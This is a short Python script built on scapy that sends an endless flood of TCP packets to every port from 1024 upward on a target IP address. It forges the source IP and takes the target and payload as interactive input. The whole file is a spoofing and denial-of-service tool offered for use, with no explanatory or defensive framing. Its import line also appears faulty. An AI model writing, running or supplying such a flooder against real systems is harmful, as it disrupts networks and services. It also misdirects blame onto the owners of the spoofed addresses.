#!/usr/bin/python

from scapy.all import scapy


def flood(src, tgt, msg):
    for dst_port in range(1024, 65535):
        ip_layer = scapy.IP(src=src, dst=tgt)
        tcp_layer = scapy.TCP(sport=4444, dport=dst_port)
        raw_layer = scapy.Raw(load=msg)
        pkt = ip_layer / tcp_layer / raw_layer
        scapy.send(pkt)


if __name__ == "__main__":
    src = input("! Enter source ip to fake: ")
    tgt = input("! Enter target ip: ")
    msg = input("! Message for TCP payload: ")

    while True:
        flood(src, tgt, msg)
